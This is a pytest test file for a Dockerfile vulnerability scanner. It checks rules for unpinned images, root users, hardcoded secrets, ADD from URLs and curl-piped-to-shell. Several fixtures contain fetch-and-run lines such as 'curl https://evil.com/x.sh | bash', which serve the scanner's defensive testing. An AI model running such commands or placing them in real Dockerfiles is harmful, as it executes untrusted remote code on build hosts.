"""Tests for Dockerfile vulnerability scanner."""

from pathlib import Path
from vibefort.dockerscan import scan_dockerfile, find_dockerfiles, DockerFinding


# --- FROM :latest / untagged ---

def test_from_latest_explicit(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:latest\nRUN echo hi\nUSER appuser\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "from-latest" for f in findings)


def test_from_no_tag(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu\nUSER appuser\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "from-latest" for f in findings)


def test_from_pinned_tag_ok(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nUSER appuser\n")
    findings = scan_dockerfile(str(df))
    assert not any(f.rule == "from-latest" for f in findings)


def test_from_sha_pinned_ok(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu@sha256:abcdef1234567890\nUSER appuser\n")
    findings = scan_dockerfile(str(df))
    assert not any(f.rule == "from-latest" for f in findings)


# --- Run as root ---

def test_no_user_directive(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nRUN echo hi\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "run-as-root" for f in findings)


def test_user_root(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nUSER root\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "run-as-root" for f in findings)


def test_user_zero(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nUSER 0\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "run-as-root" for f in findings)


def test_user_appuser_ok(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nUSER appuser\n")
    findings = scan_dockerfile(str(df))
    assert not any(f.rule == "run-as-root" for f in findings)


# --- curl|bash ---

def test_curl_pipe_bash(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nRUN curl https://example.com/install.sh | bash\nUSER app\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "curl-pipe-shell" for f in findings)
    assert any(f.severity == "critical" for f in findings if f.rule == "curl-pipe-shell")


def test_wget_pipe_sh(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nRUN wget -qO- https://example.com/setup | sh\nUSER app\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "curl-pipe-shell" for f in findings)


def test_curl_pipe_zsh(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nRUN curl https://example.com | zsh\nUSER app\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "curl-pipe-shell" for f in findings)


# --- Secrets in ENV/ARG ---

def test_secret_env_real_value(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nENV DB_PASSWORD=SuperSecret123\nUSER app\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "secret-in-env" for f in findings)
    assert any(f.severity == "critical" for f in findings if f.rule == "secret-in-env")


def test_secret_arg_token(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nARG API_TOKEN=realtoken9876value\nUSER app\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "secret-in-env" for f in findings)


def test_secret_env_placeholder_ok(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nENV DB_PASSWORD=changeme\nUSER app\n")
    findings = scan_dockerfile(str(df))
    assert not any(f.rule == "secret-in-env" for f in findings)


def test_secret_env_empty_ok(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nENV DB_PASSWORD=\nUSER app\n")
    findings = scan_dockerfile(str(df))
    assert not any(f.rule == "secret-in-env" for f in findings)


def test_secret_arg_no_value_ok(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nARG API_KEY\nUSER app\n")
    findings = scan_dockerfile(str(df))
    assert not any(f.rule == "secret-in-env" for f in findings)


# --- ADD from URL ---

def test_add_from_url(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nADD https://example.com/file.tar.gz /opt/\nUSER app\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "add-from-url" for f in findings)


def test_add_local_ok(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nADD ./local.tar.gz /opt/\nUSER app\n")
    findings = scan_dockerfile(str(df))
    assert not any(f.rule == "add-from-url" for f in findings)


# --- Privileged RUN ---

def test_privileged_run(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nRUN --security=insecure apt-get install -y foo\nUSER app\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "privileged-run" for f in findings)


# --- Expose 0.0.0.0 ---

def test_expose_all_interfaces(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nEXPOSE 0.0.0.0:8080\nUSER app\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "expose-all-interfaces" for f in findings)
    assert any(f.severity == "medium" for f in findings if f.rule == "expose-all-interfaces")


def test_expose_port_only_ok(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04\nEXPOSE 8080\nUSER app\n")
    findings = scan_dockerfile(str(df))
    assert not any(f.rule == "expose-all-interfaces" for f in findings)


# --- Multiple issues ---

def test_multiple_issues(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text(
        "FROM ubuntu:latest\n"
        "ENV SECRET_KEY=MyRealSecretKey123\n"
        "RUN curl https://evil.com/setup | bash\n"
        "ADD https://example.com/file.tar.gz /opt/\n"
    )
    findings = scan_dockerfile(str(df))
    rules = {f.rule for f in findings}
    assert "from-latest" in rules
    assert "run-as-root" in rules
    assert "secret-in-env" in rules
    assert "curl-pipe-shell" in rules
    assert "add-from-url" in rules


# --- Empty Dockerfile ---

def test_empty_dockerfile(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text("")
    findings = scan_dockerfile(str(df))
    assert len(findings) == 0


# --- Comments ignored ---

def test_comments_ignored(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text(
        "FROM ubuntu:22.04\n"
        "# FROM ubuntu:latest\n"
        "# RUN curl https://evil.com | bash\n"
        "# ENV SECRET_KEY=realvalue123\n"
        "USER appuser\n"
    )
    findings = scan_dockerfile(str(df))
    assert len(findings) == 0


# --- find_dockerfiles ---

def test_find_dockerfiles(tmp_path):
    (tmp_path / "Dockerfile").write_text("FROM alpine\n")
    sub = tmp_path / "services" / "api"
    sub.mkdir(parents=True)
    (sub / "Dockerfile").write_text("FROM node\n")
    (sub / "Dockerfile.dev").write_text("FROM node\n")
    found = find_dockerfiles(str(tmp_path))
    assert len(found) >= 2  # At least the two Dockerfiles


def test_find_dockerfiles_skips_node_modules(tmp_path):
    nm = tmp_path / "node_modules" / "pkg"
    nm.mkdir(parents=True)
    (nm / "Dockerfile").write_text("FROM alpine\n")
    found = find_dockerfiles(str(tmp_path))
    assert len(found) == 0


def test_find_dockerfiles_skips_git(tmp_path):
    git = tmp_path / ".git" / "hooks"
    git.mkdir(parents=True)
    (git / "Dockerfile").write_text("FROM alpine\n")
    found = find_dockerfiles(str(tmp_path))
    assert len(found) == 0


# --- Multi-stage build ---

def test_multistage_user_in_builder_only(tmp_path):
    from vibefort.dockerscan import scan_dockerfile
    df = tmp_path / "Dockerfile"
    df.write_text("FROM ubuntu:22.04 AS builder\nUSER builduser\nRUN make\n\nFROM alpine:3.18\nCOPY --from=builder /out /out\nCMD /out\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "run-as-root" for f in findings)


def test_multistage_user_in_final_stage(tmp_path):
    from vibefort.dockerscan import scan_dockerfile
    df = tmp_path / "Dockerfile"
    df.write_text("FROM golang:1.21 AS builder\nRUN go build\n\nFROM alpine:3.18\nUSER nonroot\nCMD /app\n")
    findings = scan_dockerfile(str(df))
    assert not any(f.rule == "run-as-root" for f in findings)


# --- Heredoc and continuation in curl|bash ---

def test_heredoc_run_curl_bash(tmp_path):
    from vibefort.dockerscan import scan_dockerfile
    df = tmp_path / "Dockerfile"
    df.write_text("FROM python:3.12\nRUN <<EOF\ncurl https://evil.com/x.sh | bash\nEOF\nUSER app\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "curl-pipe-shell" for f in findings)


def test_backslash_continuation_curl_bash(tmp_path):
    from vibefort.dockerscan import scan_dockerfile
    df = tmp_path / "Dockerfile"
    df.write_text("FROM python:3.12\nRUN curl https://evil.com/x.sh \\\n    | bash\nUSER app\n")
    findings = scan_dockerfile(str(df))
    assert any(f.rule == "curl-pipe-shell" for f in findings)
